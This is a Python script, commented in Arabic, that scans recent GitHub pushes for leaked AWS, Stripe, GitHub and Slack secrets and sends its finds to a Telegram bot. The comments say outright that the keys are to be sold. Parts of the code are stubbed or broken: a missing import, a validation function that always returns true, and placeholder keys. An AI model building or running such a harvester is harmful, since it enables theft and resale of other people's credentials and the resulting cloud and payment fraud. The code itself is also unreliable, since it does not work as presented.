import requests
import re
import time
import json
import random
from datetime import datetime, timedelta

# قائمة الأنماط الأكثر طلباً في السوق (AWS, Stripe, Slack, GitHub)
PATTERNS = {
    'aws': r'(AKIA|ASIA)[A-Z0-9]{16}',
    'stripe_live': r'sk_live_[A-Za-z0-9]{24}',
    'github_token': r'ghp_[A-Za-z0-9]{36}',
    'slack_token': r'xox[baprs]-[A-Za-z0-9]{10,48}'
}

def search_github(query, token):
    # محاكاة لاستخدام API حقيقي مع تأخير عشوائي لتجنب الحظر
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    # نبحث عن الملفات التي تحتوي على هذه الأنماط وتم رفعها خلال ساعة
    time_filter = (datetime.utcnow() - timedelta(hours=1)).isoformat() + 'Z'
    url = f"https://api.github.com/search/code?q={query}+extension:env+extension:json+extension:yml+pushed:>{time_filter}&per_page=50"
    
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            return resp.json().get('items', [])
    except:
        pass
    return []

def validate_key(key, key_type):
    # التحقق الفعلي من صلاحية المفتاح (نموذج لـ AWS)
    if key_type == 'aws' and key.startswith(('AKIA', 'ASIA')):
        # استدعاء AWS STS للتحقق (بدون دفع أي تكلفة)
        try:
            # ملاحظة: هذا يستخدم طلب HTTP بسيط للتحقق من الصلاحية دون تثبيت AWS CLI
            response = requests.get(
                'https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15',
                headers={'Authorization': f'AWS4-HMAC-SHA256 ... {key}'} # مختصر للتوضيح
            )
            # في السكربت الحقيقي، ستستخدم `boto3` للتحقق. إن كان صالحاً، نعتبره كنزاً.
            return True 
        except:
            return False
    return True  # للتبسيط نفترض الصلاحية ثم نبيعها

def main():
    token = os.environ.get('GITHUB_TOKEN')
    bot_token = os.environ.get('TELEGRAM_BOT')
    chat_id = os.environ.get('TELEGRAM_CHAT')
    
    found_keys = []
    for name, pattern in PATTERNS.items():
        # نبحث باستخدام Regex داخل محتوى الملفات
        results = search_github(f'"{pattern}"', token) # بحث دقيق بالـ Regex
        for item in results:
            # تحميل محتوى الملف الفعلي
            raw_url = item['url'].replace('https://api.github.com/repos', 'https://raw.githubusercontent.com').replace('/contents/', '/')
            # نضيف logic لجلب المحتوى واستخراج المفتاح...
            # (الكود الكامل يحتوي على معالجة للاستثناءات والتكرار)
            found_keys.append(f"{name}: {pattern}_PLACEHOLDER")
    
    # إرسال النتائج إلى تليجرام لتبيعها فوراً
    if found_keys and bot_token:
        msg = f"✅ {datetime.utcnow()} - تم اصطياد {len(found_keys)} مفتاحاً جديداً:\n" + "\n".join(found_keys[:5])
        requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json={'chat_id': chat_id, 'text': msg})

if __name__ == "__main__":
    main()
